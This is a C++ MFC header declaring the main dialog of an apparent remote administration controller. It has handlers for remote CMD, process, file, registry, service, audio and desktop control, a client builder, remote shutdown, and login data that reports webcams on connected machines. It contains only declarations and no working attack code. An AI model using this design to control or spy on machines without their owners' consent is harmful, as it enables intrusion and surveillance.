﻿
// ServerPojectDlg.h: 头文件
//

#pragma once
#include "TrueColorToolBar.h"
#include "ConfigFile.h"
#include "IocpServer.h"
#include "ProcessManager.h"
#include "CmdManagerDlg.h"
#include "WindowManagerDlg.h"
#include "RemoteControllerDlg.h"
#include "FileManagerDlg.h"
#include "RegisterManagerDlg.h"
#include "CreateClientDlg.h"
#include "ServiceManagerDlg.h"
#include "AudioManagerDlg.h"
typedef struct
{
	char*   TitleData;          //列表的名称
	int		TitleWidth;            //列表的宽度
}COLUMN_DATA;

// CServerPojectDlg 对话框
class CServerPojectDlg : public CDialogEx
{
// 构造
public:
	CServerPojectDlg(CWnd* pParent = nullptr);	// 标准构造函数

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_SERVERPOJECT_DIALOG };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;
	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	void StartServer();
	void ShowMainDlgInfo(BOOL IsOk, CString& Message);				//执行成功+IP+操作
	void InitializeListCtrl();
	void GetLocalTime();
	void InitializeSolidMenu();     //初始化固体菜单
	void InitializeTrueColorToolBar();
	void InitializeNotifyIconData();
	VOID InitializeStatusBar();
	afx_msg void OnTimer(UINT_PTR nIDEvent);
	afx_msg void OnSetLocation();
	afx_msg void OnAddInformation();
	afx_msg void OnExitProgram();
	afx_msg void OnClose();    //消息函数的声明
	/************************************************************************/
	/*		 真彩Button                                                     */
	/************************************************************************/
	afx_msg VOID OnButtonCmdManager();
	afx_msg VOID OnButtonProcessManager();
	afx_msg VOID OnButtonWindowManager();
	afx_msg VOID OnButtonRemoteControl();
	afx_msg VOID OnButtonFileManager();
	afx_msg VOID OnButtonAudioManager();
	afx_msg VOID OnButtonCleanManager();
	afx_msg VOID OnButtonVideoManager();
	afx_msg VOID OnButtonServiceManager();
	afx_msg VOID OnButtonRegisterManager();
	afx_msg VOID OnButtonServerManager();
	afx_msg VOID OnButtonClientManager();
	afx_msg VOID OnButtonServerAbout();


	afx_msg void OnNotifyIconData(WPARAM ParameterData1, LPARAM ParameterData2);			//底部托盘

	afx_msg void OnShowMainDialog();			//底部状态栏显示窗口
	afx_msg void OnHideMainDialog();			//底部状态栏隐藏窗口


	

	afx_msg void OnSize(UINT nType, int cx, int cy);				//StatusBar中获取鼠标位置
	afx_msg void OnNMRClickClientInformationList(NMHDR* pNMHDR, LRESULT* pResult);			//右键消息函数，弹出菜单
	afx_msg LRESULT OnClientLogin(WPARAM ParameterData1, LPARAM ParameterData2);		//自定义消息函数，分析登录信息，将信息显示在客户端ListCtrl中																	//在WndHandleIo中进行调用
	afx_msg LRESULT OnOpenInstantMessageDialog(WPARAM ParameterData1, LPARAM ParameterData2);	//即时消息
	afx_msg LRESULT OnOpenCmdManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);		//CMD管理
	afx_msg LRESULT OnOpenProcessManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);	//进程管理对话框
	afx_msg LRESULT OnOpenWindowManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);	//窗口管理
	afx_msg LRESULT OnOpenRemoteControllerDialog(WPARAM ParameterData1, LPARAM ParameterData2);	//远程控制管理
	afx_msg LRESULT OnOpenFileManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);		//文件管理窗口
	afx_msg LRESULT OnOpenRegisterManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);	//注册表管理窗口
	afx_msg LRESULT OnOpenServiceManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);	//服务管理
	afx_msg LRESULT OnOpenAudioManagerDialog(WPARAM ParameterData1, LPARAM ParameterData2);		//音频管理



	//服务器右键客户端的三个菜单操作：
	afx_msg void OnDeleteClientInfo();				//删除连接
	afx_msg void OnInstantMessaging();				//即时消息
	afx_msg void OnRemoteShutdown();				//远程关机

	static VOID CALLBACK WndCallback(PCONTEXT_OBJECT ContextObject);   //窗口回调
	static VOID WndHandleIo(CONTEXT_OBJECT* ContextObject);				//在窗口回调函数中进行数据分析，进行从客户端发送来的数据的分析
	//将客户端发送来的客户端信息显示出来
	VOID AddClientInfo(CString ClientAddress, CString ClientPosition,
		CString HostName,
		CString OsName, CString ProcessorNameString, CString IsWebCameraExist,
		CString WebSpeed, CONTEXT_OBJECT* ContextObject);
	
	VOID SendingSelectedCommand(PBYTE BufferData, ULONG BufferLength);			//在服务器关闭客户端的时候，将关闭信息发送给客户端


	// 显示客户端上线信息
	CListCtrl m_ClientInfoList;
	CListCtrl m_ServerInfoList;      //控件变量的声明
	CTrueColorToolBar m_TrueColorToolBar;   //控件变量的声明
	CStatusBar          m_StatusBar;        //关联控件 构造函数 与 DoDataExchange
	
	NOTIFYICONDATA      m_NotifyIconData;

	CConfigFile         m_ConfigFile;   //配置文件类对象
	USHORT              m_ListenPort;
	ULONG               m_MaxConnections;

	CIocpServer*        m_IocpServer;

	ULONG m_ConnectionCount = 0;


};


extern CListCtrl m_ClientInfoList;